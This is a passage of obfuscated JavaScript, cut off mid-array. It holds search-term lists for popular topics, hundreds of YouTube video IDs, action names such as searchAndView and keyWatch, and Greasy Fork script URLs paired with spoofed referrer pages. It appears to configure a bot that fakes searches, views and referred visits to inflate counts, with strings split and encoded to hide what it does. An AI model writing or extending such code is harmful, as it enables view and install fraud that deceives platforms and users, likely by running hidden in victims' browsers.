searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + Y(0x15, 'uW6v') + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + Y(0x13, 'rOVN') + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x6 * 0x119 + -0x163b + 0xfaf * 0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x29 * -0x41 + -0x790 * 0x3 + -0x41b * -0x3)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1d88 + 0x23f + -0x1fc4);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    Z(0x1c) + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    Z(0xf) + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + X(0x1f) + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + X(0x11) + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0xd) + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x7) + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x10) + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + X(0x3) + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x4) + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + Z(0x1) + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
